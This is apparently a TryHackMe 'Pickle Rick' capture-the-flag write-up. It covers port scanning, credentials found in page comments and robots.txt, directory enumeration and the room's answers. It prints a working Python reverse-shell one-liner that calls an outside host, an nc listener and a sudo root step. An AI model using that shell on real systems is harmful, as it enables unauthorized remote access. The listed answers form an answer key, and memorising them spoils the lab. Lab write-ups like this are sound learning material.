# Tryhackme

## **Pickle Rick pentest and hacking**

- ### Port scanning with nmap

  ```bash
  nmap 10.10.223.5
  ```

  | PORT   | STATE | SERVICE |
  | ------ | ----- | ------- |
  | 22/tcp | open  | ssh     |
  | 80/tcp | open  | http    |

  ```bash
  nmap -sV -p 22,80 10.10.223.5
  ```

  | PORT   | STATE | SERVICE | VERSION                                                      |
  | ------ | ----- | ------- | ------------------------------------------------------------ |
  | 22/tcp | open  | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) |
  | 80/tcp | open  | http    | Apache httpd 2.4.18 ((Ubuntu))                               |

- ### Open webapplication with browser **10.10.223.5**

  1.  html comments

      ***

      Note to self, remember username!

      > Username: R1ckRul3s

      ***

  2.  url/robots.txt
      ***
      > Wubbalubbadubdub
      ***
  3.  url/login.php

      ***

      > username: R1ckRul3s

      > password: Wubbalubbadubdub

      ***

  4.  login and execute reverse shell using python3

  <https://www.revshells.com/>

  <https://pentestmonkey.net/>

  - Reverse shell command
    ```python3
        export RHOST="1.1.1.1";export RPORT=3333;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")
    ```
  - Listener command
    ```bash
    nc -lvnp 3333
    ```
  - Root access
    ```bash
      sudo bash -i
    ```

- ### List directories with gobuster

  ```bash
  gobuster dir -u http://10.10.223.5/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

  Gobuster v3.2.0-dev
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.223.5/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.2.0-dev
  [+] Extensions:              php,html,txt
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /assets               (Status: 301) [Size: 313] [--> http://10.10.151.54/assets/]
  /denied.php           (Status: 302) [Size: 0] [--> /login.php]
  /index.html           (Status: 200) [Size: 1062]
  /index.html           (Status: 200) [Size: 1062]
  /login.php            (Status: 200) [Size: 882]
  /portal.php           (Status: 302) [Size: 0] [--> /login.php]
  /robots.txt           (Status: 200) [Size: 17]
  /robots.txt           (Status: 200) [Size: 17]

  Progress: 18456 / 18460 (99.98%)===============================================================
  ```

- ### Answer the questions below

  1. What is the first ingredient Rick needs?
     > mr. meeseek hair
  2. Whats the second ingredient Rick needs?
     > 1 jerry tear
  3. Whats the final ingredient Rick needs?
     > fleeb juice
